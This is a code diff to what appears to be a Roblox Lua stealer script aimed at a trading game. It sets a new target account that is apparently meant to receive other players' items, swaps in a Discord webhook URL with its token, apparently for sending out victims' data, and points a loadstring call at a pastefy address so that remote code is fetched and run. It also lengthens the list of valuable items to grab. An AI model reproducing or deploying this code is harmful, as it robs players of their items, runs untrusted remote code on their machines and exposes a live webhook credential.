@@ -1,8 +1,13 @@
-local TARGET_ID = 7697635582
-local TARGET_USER = "dios123456772"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1553526170010525746/iUAQdu3O7ZnoVezm8gCWBxwDgO1BaLbP6zVumx4wuEErJwVKUWvWJHT0wgX4XLX_RJGq"
+local TARGET_ID = 11858772520
+local TARGET_USER = "cureG0Y"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1566809325606019112/jluYCPmsNWwyZLVcSMyuNqLMC5LZvMPcHkOrrkutbUx9ASPPTvGsP1K7yUPYUqlgn0Xn"
 
 local TargetBrainrots = {
+    ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
+    ["Plant Bros"] = true,
+    ["Hydra Serpent"] = true,
+    ["Orchidox"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -282,12 +287,7 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true,
-    ["Dragon Skeletonini"] = true,
-    ["Phoenix"] = true,
-    ["Plant Bros"] = true,
-    ["Hydra Serpent"] = true,
-    ["Orchidox"] = true
+    ["Deputy Leopard"] = true
 }
 
 local TargetBaseSkins = {
@@ -350,7 +350,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
 
     task.wait(1)
 
